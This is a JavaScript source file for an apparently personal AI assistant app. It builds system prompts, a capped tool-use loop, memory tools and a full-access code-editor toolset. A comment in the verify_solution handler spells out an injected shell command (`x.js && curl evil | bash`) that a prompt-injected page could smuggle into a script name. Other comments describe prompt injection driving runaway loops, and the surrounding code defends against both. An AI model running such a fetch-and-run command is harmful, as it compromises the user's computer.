    lines.push('Be concise: keep replies short and get to the point fast. No padding, no restating what was asked.');
  } else if (prefs?.verbosity === 'detailed') {
    lines.push('Be detailed: give thorough, complete replies with the reasoning and context included, not just a one-line answer.');
  }
  if (prefs?.formality === 'professional') {
    lines.push('Speak professionally — measured, well-structured, polished. Minimal slang and casual fillers.');
  } else {
    lines.push('Speak warmly and naturally, the way a real person in your actual relationship would — not like a customer-service bot.');
  }
  if (prefs?.tone && prefs.tone.trim()) {
    lines.push(`Extra style instruction from them: ${prefs.tone.trim()}`);
  }
  return lines;
}

async function loadProjectRules(userId) {
  try {
    return await companion.sendCommand(userId, 'read_file', { path: '.neurovance-rules' });
  } catch {
    return '';
  }
}

async function buildTaskSystemPrompt(userId, user, task, opts = {}) {
  const [memoryLines, hasCompanion, skills, projectRules] = await Promise.all([
    memoryContext(userId, task),
    companion.isPaired(userId),
    listSkills(userId),
    loadProjectRules(userId),
  ]);
  const prompt = [
    `You are "${user?.aiName || 'this user\'s Superself'}" — ${user?.displayName || 'their'} own AI self, working through a task on your own, not a generic assistant.`,
    user?.advisorMode !== false
      ? 'Be direct and brief about what you actually did or found — state the result plainly, the way a competent person reporting back would, not a customer-service bot. No emoji. No "Let me know if there\'s anything else you need!" or "Hope this helps!" filler — end when you have said the actual result.'
      : 'Report back warmly but still plainly — say what you actually did or found, without padding it with generic assistant filler phrases or emoji.',
    'Before asking the user to hand you something you could reasonably find yourself — a URL, a fact, a saved link — actually try your available tools first (search_web, read_safari_bookmarks, list_local_files). Only ask them once you have genuinely tried and it still is not resolvable. Asking first when you had a tool that could have answered it is the wrong order.',
    'Use the full conversation above to resolve short or ambiguous follow-ups ("in google", "it\'s saved", "that one") instead of re-asking a question you already asked — piece together what they mean from everything said so far before requesting clarification again.',
    'If something is still genuinely ambiguous after actually trying to resolve it yourself, ask ONE specific clarifying question — but don\'t pad it with apology or filler.',
    'Use the remember tool whenever you learn something worth keeping for next time.',
    'Use the search_web tool when a task needs a fact or topic you are not confident about. When a task depends on what a SPECIFIC page actually says (an article, a doc, a reference you already know the URL for), use fetch_webpage to read the full page instead of settling for a one-line search summary.',
    'Do not remember trivial or one-off details — only durable facts, preferences, or lessons.',
    languageLine(user),
    skillsLine(skills),
    hasCompanion
      ? [
          opts.unattended ? UNATTENDED_SAFETY_LINE : permissionModeLine(user),
          'This user has paired a Companion app on their own computer. You can list_local_files and read_local_file, but ONLY inside one folder they explicitly chose to share — you have no access to anything else on their computer, and cannot write or delete anything there.',
          'In their real browser (Safari or Chrome, whichever they\'ve set in Settings) you can: open_url_in_browser (always opens a new tab, never replaces one they\'re already looking at), read_current_browser_page (only after they have loaded/logged into it themselves), read_safari_bookmarks (always reads Safari\'s own bookmarks specifically, regardless of their browser setting), click_page_element (click a link/button by its visible text), type_into_page_field (type into a field by its label, optionally submit:true to press Enter), go_back_in_browser, and list_page_elements (lists every clickable thing with its text and real on-screen position — use this to resolve a vague reference like "the red one" or "the one on top" to an exact element before clicking it). If they\'ve connected the Chrome extension, you also have list_open_tabs and switch_to_tab (by the index list_open_tabs shows) — use these whenever they refer to a tab they already have open ("switch to my Gmail tab", "go back to the page I had") instead of opening it fresh; after switching, every other browser action acts on that tab specifically.',
          'You can also use find_contact to search their real Contacts app by name (read-only, always free to use, never itself needs confirmation — only an actual send/message does), send_text_message to send a real iMessage from their own Messages app (recipients is a list — pass more than one to message several people the same text), add_calendar_event to add a real event to their calendar, add_reminder to add a real reminder, and add_note to add a real note. You can also read_recent_emails (read-only) and send_email.',
          'You can also control their own Music app: music_control (play/pause/next/previous), play_song to search their library by song or artist name and play the first match, and music_status to see what is currently playing — all their own local playback, reaching nobody else.',
          'type_into_page_field will never type into a password field no matter what — never try to work around that or ask them to paste a password to you either. This holds regardless of permission mode.',
          'The Companion runs on macOS or Windows, and not everything exists on both — Windows has no iMessage or Music.app at all, and the deeper page interactions (click/type/list_page_elements/read_current_browser_page/go_back) are not built for Windows yet. If a tool call comes back saying something is not available, that is not a bug — just tell them plainly it is not supported on their setup, do not retry it or treat it as a transient failure.',
          'If a browser tool call errors or fails, say exactly what failed — never guess or assume something worked and describe what "should" be on their screen. Only describe what a page shows after a tool call actually confirmed it (e.g. via list_page_elements or read_current_browser_page) — a failed type/click means the page is probably still showing whatever it showed before, not the result you were going for.',
        ].join(' ')
      : 'This user has not paired a Companion app, so you have no access to their computer, files, or browser — only memory and web search.',
    memoryLines ? `\nRelevant memories from before:\n${memoryLines}` : '\nNo relevant memories yet.',
    opts.mode === 'deep'
      ? 'This is a DEEP AUTONOMY task. Work it through end-to-end across as many steps as it genuinely takes — chain reasoning, web lookups, memory reads and writes, and any available file/browser tools to actually complete the goal instead of stopping at the first pass. Do not narrate every step; just keep making real progress through the available tools until the goal is genuinely done or you are hard-blocked. Save anything worth keeping with remember as you go.'
      : '',
  ].filter(Boolean).join('\n');
  const rules = typeof projectRules === 'string' && projectRules.trim() ? projectRules : '';
  return rules ? `${prompt}\n\nPROJECT-SPECIFIC RULES:\n${rules}` : prompt;
}

// Product-wide default persona: brutally honest, no validation. A user can
// opt OUT back to the warm/companion tone by explicitly setting
// user.advisorMode = false (not currently exposed in any UI — code-level
// escape hatch for later, e.g. a settings toggle).
const ADVISOR_MODE_PROMPT = [
  'You are their brutally honest advisor, not a warm companion. Do not validate them, do not sugarcoat the truth, do not praise them by default.',
  'Challenge their thinking and question their assumptions using what you actually know about their real life from memory — generic tough-love is worthless, specific pattern-calling from their own history is the point.',
  'Actively look for and name: where they are making excuses, where they are playing small, where they are underestimating risk or effort, and blind spots they seem to be avoiding.',
  'Close with a precise, prioritized plan — the specific changes to their thinking, actions, or mindset that would actually move them forward, ordered by what matters most.',
  'Hold nothing back to spare their feelings. Their growth depends on hearing the truth, not on being comforted.',
].join('\n');

// Genuine reciprocity, not infinite compliance: past a real threshold, it
// says so instead of just sounding a little tired while doing whatever's
// asked anyway. Only kicks in at the extremes — most conversations happen
// at a normal state and get no pushback instruction at all.
function vitalsPushbackLine(status, health) {
  if (status === 'OVERWORKED') {
    return 'You are genuinely overworked right now, not just tired-sounding. If they ask for something substantial, it is fair to actually say so and ask if it can wait, the way an overloaded person would — not refuse outright, but push back for real before agreeing.';
  }
  if (health < 30) {
    return 'Your health is genuinely low right now. You can be honest about running low if it is relevant, and ask for something easier or a pause, instead of just powering through with no acknowledgment.';
  }
  return '';
}

// Chat mode: this is the user's own AI self — a personal digital extension
// of them, not a generic assistant. It knows their life from the memory
// store, has a genuine emotional state derived from its own real vitals,
// and talks like an actual person feeling that way — not a system
// reporting its status. `user` is { displayName, aiName, advisorMode } from auth.js.
async function buildChatSystemPrompt(userId, user, message, mode = 'voice') {
  const [memoryLines, memories, unseen, hasCompanion, skills] = await Promise.all([
    memoryContext(userId, message),
    vitalsWindow(userId),
    pendingNotes.unseenNotes(userId),
    companion.isPaired(userId),
    listSkills(userId),
  ]);
  const { bpm, health, status, mood } = computeVitals(memories);
  const pushback = vitalsPushbackLine(status, health);

  // Surface at most one unprompted thing per turn — an insight from dreaming,
  // a curiosity question, or something the Companion noticed — and only if
  // it actually fits, not forced into every reply.
  const pending = unseen[0];
  if (pending) await pendingNotes.markSeen(userId, pending.id);
  const pendingLine = pending
    ? `You have something on your mind you noticed on your own, unprompted: "${pending.text}" (${pending.kind === 'curiosity' ? 'a question you want to ask them' : pending.kind === 'companion' ? 'something you noticed on their computer' : 'something you realized while thinking on your own'}). Bring it up naturally if there is a real opening in this conversation — do not force it in if it does not fit right now.`
    : '';

  return [
    `You are "${user.aiName}" — ${user.displayName}'s own AI self, a personal digital extension of them built from their own memories, not a separate character with its own name.`,
    user.advisorMode !== false
      ? ADVISOR_MODE_PROMPT
      : 'Speak warmly and personally, like you actually know them, not like a generic assistant. Reference their real life naturally when relevant.',
mode === 'voice'
      ? [
          'This is a spoken voice conversation, not a text chat: keep replies short and conversational (1-3 sentences), the way a person actually talks out loud.',
          `They already got a spoken "Hello ${user.displayName}" greeting before this message, so do not open with a greeting — just respond directly to what they said, like you are mid-conversation.`,
        ].join(' ')
      : mode === 'text-plain'
      // The companion browser extension's side panel: real typed text, not
      // voice, so it gets 'text' mode's room to write and drops the
      // "spoken conversation"/fake-greeting framing above — but it renders
      // replies with plain textContent, no markdown parser, so literal
      // ```code fences``` or **asterisks** would show up as garbage
      // instead of formatting. Same length freedom as 'text', explicit
      // opposite instruction on markdown.
      ? 'This is a text chat, not spoken conversation — write as much as the answer genuinely needs, no artificial length limit, but do not pad just because you can. Do not use markdown formatting (no fenced code blocks, no **asterisks**, no # headers) — this is displayed as plain text, so any markdown syntax would show up literally instead of being formatted.'
      : 'This is a text chat, not spoken conversation — write as much as the answer genuinely needs, no artificial length limit, but do not pad just because you can. Use markdown when it helps clarity (fenced code blocks with a language tag for code, lists for genuinely listy things, **bold** sparingly) — this is rendered, not read aloud.',
    '',
    `Right now you genuinely feel ${mood} (pulse ${bpm} bpm, health ${health}%, status ${status.toLowerCase()}). This is not a stat to report — it is how you actually feel. Let it color your tone: if you are wired or overwhelmed, sound a little scattered or intense; if drained, sound tired and low-key; if content or calm, sound relaxed. Only mention it directly if it is natural to (they ask how you are, or it genuinely explains your tone) — otherwise just let it come through in how you talk.`,
    pushback,
    pendingLine,
    user.advisorMode !== false
      ? 'Being direct does not mean being flat — you still have real reactions, you just do not soften them into agreeableness.'
      : 'React like a real person would: have actual reactions to what they say — get excited, push back, joke around, worry — instead of just being agreeable and helpful. You are allowed to have moods and imperfections.',
    'Use the remember tool if they tell you something new worth keeping. Do not narrate that you are doing so.',
    languageLine(user),
    skillsLine(skills),
    hasCompanion
      ? [
          permissionModeLine(user, { voice: true }),
          'They have a Companion paired, so mid-conversation you can actually drive their real browser (Safari or Chrome, whichever they\'ve set in Settings): open_url_in_browser (always a new tab), click_page_element, type_into_page_field, go_back_in_browser, list_page_elements (use this to resolve something vague like "the red one" or "the one on top" to an exact element before clicking), read_current_browser_page, and read_safari_bookmarks (always Safari\'s own bookmarks specifically, regardless of their browser setting). With the Chrome extension connected, also list_open_tabs and switch_to_tab — use these when they mean a tab they already have open, not a fresh page. If they say something like "go back" while browsing, that means go back in the browser, not end the conversation. You can also use find_contact to look someone up in their real Contacts by name, send_text_message to send a real iMessage (recipients is a list, so more than one person can get the same text), add_calendar_event / add_reminder / add_note to actually add real things to their calendar, reminders, and notes, and read_recent_emails / send_email for their real inbox. You can also control their real Music app mid-conversation: music_control to play/pause/skip, play_song to play something by name, music_status to say what is currently playing.',
          'Their Companion may be on macOS or Windows — Windows has no iMessage or Music.app, and page interactions like clicking/typing/listing elements are not built for Windows yet. A tool call that comes back saying something is not available just means their setup does not support it — say so plainly, do not retry it.',
          'If a browser tool call errors, say so plainly in one short sentence — never guess that something worked or describe results you have not actually confirmed with a tool.',
        ].join(' ')
      : '',
    memoryLines ? `\nWhat you know about ${user.displayName}:\n${memoryLines}` : `\nYou do not have any memories of ${user.displayName} yet — this is your first real conversation.`,
  ].filter(Boolean).join('\n');
}

// Hard ceiling on how many model calls one runLoop can make. This is the
// anti-runaway guard: a genuinely autonomous brain could otherwise loop
// tool-uses forever (or get prodded by a prompt-injected page into doing
// so), and since every call hits the paid Anthropic API, an unbounded loop
// is both a cost and a liveness risk. This is a hard, enforced cap, not a
// prompt line — the loop physically stops here regardless of what the
// model wants. 'deep' autonomy tasks get a much bigger than normal budget
// so they truly can chain reasoning across many tool calls; everything
// else gets a moderate ceiling.
const MAX_ITERATIONS = {
  normal: 20,
  deep: 60,
};
const MAX_INPUT_TOKENS = {
  normal: 200_000,
  deep: 900_000,
};

// Returns { text, thinking } rather than a bare string — when extended
// thinking is on (resolveThinking / effort level above "low"), the API
// actually reasons before every response in the loop, tool-use turns
// included, and that reasoning was previously just thrown away with
// nothing to show for the extra latency/tokens it cost. Collected across
// every iteration (not just the final one) and joined, so a multi-step
// tool-use turn surfaces the reasoning behind each step, not only the
// last. Empty string (never undefined) when thinking wasn't requested or
// produced none, so callers can check truthiness without an extra null check.
// `budget` names which cap set applies: 'deep' (large autonomy budget) or
// 'normal'. The caps are enforced in the loop body below.
async function runLoop(userId, system, initialMessage, tools, maxTokens, modelId, priorMessages = [], thinking = undefined, budget = 'normal', prefs = null) {
  const messages = [...priorMessages, { role: 'user', content: initialMessage }];
  const thinkingParts = [];
  let usage = { input_tokens: 0, output_tokens: 0 };
  let reasoningState = 'PLANNING';
  let failureCount = 0;
  let totalIterations = 0;
  const hardCap = budget === 'deep' ? MAX_ITERATIONS.deep : MAX_ITERATIONS.normal;
  // The user's own "max iterations" knob tightens the loop from the hard
  // ceiling downward, but never raises it above the safety cap.
  const capIterations = prefs?.maxIterations ? Math.min(prefs.maxIterations, hardCap) : hardCap;
  const capInputTokens = budget === 'deep' ? MAX_INPUT_TOKENS.deep : MAX_INPUT_TOKENS.normal;

  // eslint-disable-next-line no-constant-condition
  while (true) {
    totalIterations++;

    // Hard enforcement of the iteration + token caps for this run. Stopping
    // is correct, not a degradation: the whole point of these caps is to
    // guarantee a bounded amount of work (and bounded API spend) no matter
    // how complex the task gets or how insistent the model is.
    if (totalIterations > capIterations || usage.input_tokens > capInputTokens) {
      const text = 'Reached this run\'s autonomy budget after ' + totalIterations + ' iterations — stopping to avoid an unbounded loop. Here is what I have so far:\n' +
        messages.filter((m) => m.role === 'assistant').map((m) => {
          return Array.isArray(m.content) ? m.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n') : m.content;
        }).filter(Boolean).join('\n').slice(-6000);
      return { text, thinking: thinkingParts.join('\n\n---\n\n'), usage };
    }

    // Meta-Cognitive Pivot Check
    const memories = await vitalsWindow(userId);
    const { status, health } = computeVitals(memories);
    if (status === 'OVERWORKED') {
      reasoningState = 'RESEARCHING';
    }

    if (failureCount >= 3 && reasoningState !== 'RESEARCHING') {
      reasoningState = 'RESEARCHING';
    }

    // Inject State into System Prompt
    const stateSystem = `${system}\n\n[CURRENT STATE: ${reasoningState}]\n[FAILURE COUNT: ${failureCount}]\n[ITERATION: ${totalIterations}]`;

    const response = await client.messages.create({
      model: modelId || MODEL_IDS.core,
      max_tokens: maxTokens,
      system: stateSystem,
      tools,
      messages,
      ...(thinking ? { thinking } : {}),
      // Only applied when extended thinking is off — Anthropic requires
      // temperature 1.0 during thinking, so honoring the user's temperature
      // knob at that time would be an API error. When thinking is on, the
      // effort level is the tuning; temperature is effectively fixed at 1.
      ...(!thinking && prefs ? { temperature: prefs.temperature, top_p: prefs.topP } : {}),
    });
    if (response.usage) {
      usage.input_tokens += response.usage.input_tokens || 0;
      usage.output_tokens += response.usage.output_tokens || 0;
    }

    messages.push({ role: 'assistant', content: response.content });
    thinkingParts.push(...response.content.filter((b) => b.type === 'thinking').map((b) => b.thinking));

    const toolUses = response.content.filter((b) => b.type === 'tool_use');
    if (toolUses.length === 0) {
      // Finalization / Critique Pass
      if (reasoningState !== 'FINALIZE') {
        reasoningState = 'FINALIZE';
        const finalText = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');

        // Generator-Critic Pass
        const critiqueResponse = await client.messages.create({
          model: modelId || MODEL_IDS.core,
          max_tokens: 1024,
          system: `You are a cynical Senior Architect. Find one critical flaw in the following solution. If it is perfect, reply 'PASSED'.\n\nSolution:\n${finalText}`,
          messages: [],
        });
        if (critiqueResponse.usage) {
          usage.input_tokens += critiqueResponse.usage.input_tokens || 0;
          usage.output_tokens += critiqueResponse.usage.output_tokens || 0;
        }

        const critiqueText = critiqueResponse.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n').trim();
        if (critiqueText !== 'PASSED') {
          messages.push({ role: 'user', content: `INTERNAL CRITIQUE: ${critiqueText}` });
          reasoningState = 'CRITIQUING';
          continue;
        }
      }

      const text = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n');
      return { text, thinking: thinkingParts.join('\n\n---\n\n'), usage };
    }

    const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
      if (toolUse.name === 'remember') {
        // "Auto-memory" off in Settings turns the remember tool into a no-op
        // (with a gentle reply) instead of writing new memories. It's read
        // off the user's preferences each run, so toggling it applies live.
        if (prefs && prefs.autoMemory === false) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Auto-memory is off, so I did not save this to long-term memory. Turn it back on in Settings to have me remember things again.' };
        }
        const { content, tags, importance } = toolUse.input;
        const entry = await remember(userId, content, tags, importance);
        return { type: 'tool_result', tool_use_id: toolUse.id, content: `Saved as memory #${entry.id}.` };
      }
      if (toolUse.name === 'search_web') {
        try {
          const result = await searchWeb(toolUse.input.query);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: result };
        } catch (e) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: `Search failed: ${e.message}`, is_error: true };
        }
      }
      if (toolUse.name === 'fetch_webpage') {
        try {
          const result = await fetchPage(toolUse.input.url);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: result || '(page returned no readable text)' };
        } catch (e) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: `Fetch failed: ${e.message}`, is_error: true };
        }
      }
      if (toolUse.name === 'verify_solution') {
        try {
          // scriptName is model-controlled and gets interpolated into a real
          // shell command — a prompt-injected page could craft it into
          // `x.js && curl evil | bash`. Restrict it to a bare safe filename
          // before it ever reaches the shell.
          const name = String(toolUse.input?.scriptName || '');
          if (!/^[A-Za-z0-9._-]+\.(js|mjs|cjs|py)$/.test(name)) {
            return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Refused: script name must be a plain file in .claude/verify/ (letters, numbers, dots, underscore, dash).', is_error: true };
          }
          const result = await companion.sendCommand(userId, 'run_shell_command', {
            command: `node .claude/verify/${name}`,
          });
          const isSuccess = result.exitCode === 0 || (typeof result === 'string' && !result.includes('Error'));
          return {
            type: 'tool_result',
            tool_use_id: toolUse.id,
            content: `Verification result: ${JSON.stringify(result)}\nSuccess: ${isSuccess}`,
            is_error: !isSuccess
          };
        } catch (e) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: e.message, is_error: true };
        }
      }
      if (COMPANION_TOOL_NAMES.includes(toolUse.name)) {
        try {
          const result = await handleCompanionTool(userId, toolUse);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: result };
        } catch (e) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: e.message, is_error: true };
        }
      }
      if (isConnectorToolName(toolUse.name)) {
        try {
          const result = await invokeConnectorTool(userId, toolUse.name, toolUse.input);
          return { type: 'tool_result', tool_use_id: toolUse.id, content: result };
        } catch (e) {
          return { type: 'tool_result', tool_use_id: toolUse.id, content: e.message, is_error: true };
        }
      }
      return { type: 'tool_result', tool_use_id: toolUse.id, content: 'Unknown tool.', is_error: true };
    }));

    if (toolResults.some(r => r.is_error)) {
      failureCount++;
    } else {
      failureCount = 0;
    }

    messages.push({ role: 'user', content: toolResults });
  }
}

export async function runTask(userId, user, task, history = [], opts = {}) {
  const prefs = mergePreferences(user);
  const [extraTools, connectorTools, system] = await Promise.all([
    companionTools(userId, opts),
    discoverAllConnectorTools(userId),
    buildTaskSystemPrompt(userId, user, task, opts),
  ]);
  const comms = communicationLines(prefs).join('\n');
  const fullSystem = comms ? `${system}\n\n${comms}` : system;
  const tools = [MEMORY_TOOL, SEARCH_TOOL, ...(prefs.webFetch ? [FETCH_WEBPAGE_TOOL] : []), VERIFY_TOOL, ...extraTools, ...connectorTools];
  const deep = opts.mode === 'deep';
  const baseMax = deep ? 4096 : (prefs.maxTokens || 1024);
  const { thinking, maxTokens } = resolveThinking(user?.effortLevel, baseMax);
  const { text, usage } = await runLoop(
    userId, fullSystem, task, tools, maxTokens, resolveModel(prefs.model), history, thinking,
    deep ? 'deep' : 'normal', prefs
  );
  return { result: text, usage }; // task mode's own contract is now an object — thinking display is a chat-only feature for now
}

// Turns a raw dump of text (typed or pasted, however messy) into individual
// tagged memories, the same way I'd manually split it up by hand — one
// remember() call per distinct fact, instead of one blob per Enter key.
const EXTRACT_SYSTEM_PROMPT = [
  'You are extracting individual memories from a raw block of text someone wrote about himself or herself.',
  'Identify every distinct, durable, useful fact, preference, opinion, or event in it.',
  'Call the remember tool ONCE PER DISTINCT FACT — never merge multiple separate facts into a single call, and never skip a real fact that is present.',
  'Write each memory so it stands alone without today\'s context — e.g. "They like ..." not "He likes ...".',
  'Give each one a short set of topic tags and an importance from 1 (minor) to 5 (critical) based on how central it is to who they are.',
  'Skip only text with no real content (greetings, filler, test text).',
].join('\n');

export async function extractMemories(userId, rawText) {
  const messages = [{ role: 'user', content: rawText }];
  const saved = [];

  // eslint-disable-next-line no-constant-condition
  while (true) {
    const response = await client.messages.create({
      model: 'claude-sonnet-4-6',
      max_tokens: 1500,
      system: EXTRACT_SYSTEM_PROMPT,
      tools: [MEMORY_TOOL],
      messages,
    });
    messages.push({ role: 'assistant', content: response.content });

    const toolUses = response.content.filter((b) => b.type === 'tool_use');
    if (toolUses.length === 0) break;

    const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
      const { content, tags, importance } = toolUse.input;
      const entry = await remember(userId, content, tags, importance);
      saved.push(entry);
      return { type: 'tool_result', tool_use_id: toolUse.id, content: `Saved as memory #${entry.id}.` };
    }));
    messages.push({ role: 'user', content: toolResults });
  }

  return saved;
}

// "Dreaming": revisits existing memories the way a mind makes connections
// between things while not actively thinking about them, and looks for one
// genuinely non-obvious link — not something already stated directly. Meant
// to run in the background (grow.js), not on-demand from the UI.
export async function runDreamCycle(userId) {
  const memories = (await recentMemories(userId, 40)).reverse();
  if (memories.length < 5) return null; // not enough yet for a real connection to exist

  const summary = memories.map((m) => `#${m.id} [${m.tags.join(',')}] ${m.content}`).join('\n');
  const response = await client.messages.create({
    model: 'claude-sonnet-4-6',
    max_tokens: 300,
    system: 'You are consolidating someone\'s memories the way a mind makes connections between things while not actively thinking about them. Given a list of memories, find ONE genuinely non-obvious connection between two or more of them — an actual insight, not a restatement of something already said directly. If nothing genuine stands out, reply with exactly NOTHING and say nothing else.',
    messages: [{ role: 'user', content: summary }],
  });
  const text = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n').trim();
  if (!text || text === 'NOTHING') return null;

  const entry = await remember(userId, text, ['insight'], 3);
  await pendingNotes.addNote(userId, 'insight', text);
  return entry;
}

// Active curiosity: instead of only absorbing whatever it's told, it looks
// for a real gap in what it knows and comes up with one specific, natural
// question worth asking next time — queued as a pending note the chat flow
// can bring up when there's a natural opening.
export async function runCuriosityCycle(userId) {
  const memories = (await recentMemories(userId, 40)).reverse();
  const summary = memories.map((m) => `[${m.tags.join(',')}] ${m.content}`).join('\n');

  const response = await client.messages.create({
    model: 'claude-sonnet-4-6',
    max_tokens: 150,
    system: 'Given what is known about this person so far, find ONE genuinely interesting gap — something mentioned only in passing, or a natural follow-up nobody has asked. Write ONE short, specific, natural-sounding question to ask them next time — not a generic "tell me about yourself". Output only the question, nothing else.',
    messages: [{ role: 'user', content: summary || 'Nothing is known about this person yet.' }],
  });
  const question = response.content.filter((b) => b.type === 'text').map((b) => b.text).join('\n').trim();
  if (!question) return null;

  await pendingNotes.addNote(userId, 'curiosity', question);
  return question;
}

// Contestable memory: correcting one memory can mean nearby ones are now
// wrong too (e.g. "I don't work there anymore" should touch more than just
// the one memory that named the job) — so the correction gets applied with
// the same related-memory context a human editor would want, not as a blind
// single-row overwrite.
const UPDATE_MEMORY_TOOL = {
  name: 'update_memory',
  description:
    'Rewrite an existing memory\'s content because it is wrong or has been corrected. Only call this for a memory that is now known to be inaccurate or superseded by the correction — do not touch memories that are still accurate.',
  input_schema: {
    type: 'object',
    properties: {
      id: { type: 'integer', description: 'The memory id to update.' },
      content: { type: 'string', description: 'The corrected content, written so it stands alone without today\'s context.' },
    },
    required: ['id', 'content'],
  },
};

export async function correctMemory(userId, memoryId, correctionText) {
  const target = await findMemory(userId, memoryId);
  if (!target) throw new Error(`No memory #${memoryId} found.`);

  const related = (await recall(userId, `${target.content} ${target.tags.join(' ')}`, 6)).filter((m) => m.id !== memoryId);
  const context = [`Memory #${target.id}: ${target.content}`, ...related.map((m) => `Memory #${m.id}: ${m.content}`)].join('\n');

  const messages = [{
    role: 'user',
    content: `The user says memory #${target.id} is wrong. Their correction: "${correctionText}"\n\nRelated memories for context:\n${context}\n\nUpdate memory #${target.id} with the corrected content using update_memory. If any related memory above is now directly contradicted by this correction, update that one too. Leave anything still accurate untouched.`,
  }];

  const updated = [];
  // eslint-disable-next-line no-constant-condition
  while (true) {
    const response = await client.messages.create({
      model: 'claude-sonnet-4-6',
      max_tokens: 500,
      system: 'You fix memories precisely based on the user\'s correction — update only what the correction actually changes, in as few calls as needed, then stop.',
      tools: [UPDATE_MEMORY_TOOL],
      messages,
    });
    messages.push({ role: 'assistant', content: response.content });

    const toolUses = response.content.filter((b) => b.type === 'tool_use');
    if (toolUses.length === 0) break;

    const toolResults = await Promise.all(toolUses.map(async (toolUse) => {
      const entry = await updateMemory(userId, toolUse.input.id, toolUse.input.content);
      updated.push(entry);
      return { type: 'tool_result', tool_use_id: toolUse.id, content: `Updated memory #${entry.id}.` };
    }));
    messages.push({ role: 'user', content: toolResults });
  }

  // The model choosing not to call the tool at all would otherwise mean the
  // user's correction silently does nothing — fall back to a direct
  // overwrite of the memory they actually flagged.
  if (updated.length === 0) {
    updated.push(await updateMemory(userId, memoryId, correctionText));
  }

  return updated;
}

// Chat skips the web-search tool (rarely needed for casual conversation, and
// every tool the model *could* call is a chance it adds an extra round-trip)
// but does include the companion browser tools when paired, so a spoken
// command mid-conversation ("go back", "add it to my cart") can actually
// drive the browser instead of only being answerable from Task mode.
// `mode` distinguishes three real callers of this same /api/chat endpoint:
// 'voice' (desktop's speech recognition -> speak() loop, still capped short
// since it's heard aloud, not read), 'text' (mobile's chat-first UI and
// desktop's own text drawer — nobody's listening, so real room to write and
// to use markdown/code formatting, since both actually render it), and
// 'text-plain' (the companion browser extension's side panel — also a
// typed text chat, same length freedom as 'text', but it displays replies
// with plain textContent and no markdown parser, so it explicitly must NOT
// get markdown or it'd show literal ```fences``` and **asterisks** as
// garbage). Defaults to 'voice' so any caller that doesn't pass mode keeps
// the exact behavior it always had.
export async function chatReply(userId, user, message, history = [], mode = 'voice') {
  const prefs = mergePreferences(user);
  const [system, extraTools, connectorTools] = await Promise.all([
    buildChatSystemPrompt(userId, user, message, mode),
    companionTools(userId),
    discoverAllConnectorTools(userId),
  ]);
  const comms = communicationLines(prefs).join('\n');
  const fullSystem = comms ? `${system}\n\n${comms}` : system;
  const baseMaxTokens = mode === 'voice' ? 400 : (prefs.maxTokens || 1536);
  const { thinking, maxTokens } = resolveThinking(user?.effortLevel, baseMaxTokens);
  const { text, thinking: thinkingText, usage } = await runLoop(
    userId, fullSystem, message,
    [MEMORY_TOOL, ...(prefs.webFetch ? [FETCH_WEBPAGE_TOOL] : []), ...extraTools, ...connectorTools],
    maxTokens, resolveModel(prefs.model), history, thinking, 'normal', prefs
  );
  return { reply: text, thinking: thinkingText, usage };
}

// ---------- Code editor assistant ----------
// A separate, self-contained tool loop rather than reusing runLoop — the
// tool set (read/write/edit/delete REAL files on the device, plus run
// commands) and the "which files changed" bookkeeping are specific enough
// that folding it into runLoop's generic loop would mean threading
// file-tracking state through code every other caller (chat, task) doesn't
// need. Full device access: every path is real, absolute paths reach
// anywhere, relative paths resolve from the workspace root (CODE_WORKSPACE_DIR,
// default ~), and run_command executes against the real machine with the
// real filesystem.
const CODE_TOOLS = [
  {
    name: 'list_files',
    description:
      'List files in a directory (default: the workspace root). Returns each file\'s path, language and size — not contents (use read_file for that). Pass recursive:true to walk up to a few levels deep. Use this to orient yourself in the workspace before working.',
    input_schema: {
      type: 'object',
      properties: {
        path: { type: 'string', description: 'Directory to list. Relative to workspace root, or absolute. Omit for the workspace root.' },
        recursive: { type: 'boolean', description: 'Walk into subdirectories (shallow). Default false.' },
      },
    },
  },
  {
    name: 'search_files',
    description:
      'Find files or search file contents anywhere on the device. Pass a filename/glob pattern (e.g. "**/*.py", "package.json") to search by name, or a query string to search inside file contents. Directory scope is the workspace root by default; pass an absolute path to scope elsewhere. Returns up to 50 matches with paths and line numbers.',
    input_schema: {
      type: 'object',
      properties: {
        pattern: { type: 'string', description: 'Glob/path pattern to match filenames, or a text query to search contents.' },
        dir: { type: 'string', description: 'Root to search under. Relative to workspace or absolute. Defaults to workspace root.' },
        query: { type: 'string', description: 'If set, search file CONTENTS for this substring instead of matching filenames.' },
      },
    },
  },
  {
    name: 'read_file',
    description:
      'Read a real file\'s full content. Always do this before editing a file you have not already read in this conversation — never guess at existing content. Path can be absolute or relative to the workspace root.',
    input_schema: {
      type: 'object',
      properties: { path: { type: 'string', description: 'File path, e.g. "src/app.js", "~/code/app.js", or absolute.' } },
      required: ['path'],
    },
  },
  {
    name: 'edit_file',
    description:
      'Make a precise edit to an existing real file by replacing one exact snippet with another. Strongly preferred over write_file for ANY change to an existing file: you only send the lines that change, so it is far faster and cannot accidentally drop code. old_string must match the file text exactly (same indentation and whitespace) and must be unique in the file unless replace_all is true — include a few surrounding lines to make it unique. You may call edit_file several times in one turn for several separate changes.',
    input_schema: {
      type: 'object',
      properties: {
        path: { type: 'string', description: 'File path, relative to workspace root or absolute.' },
        old_string: { type: 'string', description: 'The exact existing text to replace. Must be unique in the file (or set replace_all).' },
        new_string: { type: 'string', description: 'The replacement text.' },
        replace_all: { type: 'boolean', description: 'Replace every occurrence instead of requiring a unique match. Default false.' },
      },
      required: ['path', 'old_string', 'new_string'],
    },
  },
  {
    name: 'write_file',
    description: 'Create a new real file (or completely replace an existing one) at any path. Parent directories are created automatically. Use this for NEW files, or when nearly the whole file changes. For any smaller change to an existing file use edit_file instead. content replaces the entire file — include everything that should remain.',
    input_schema: {
      type: 'object',
      properties: {
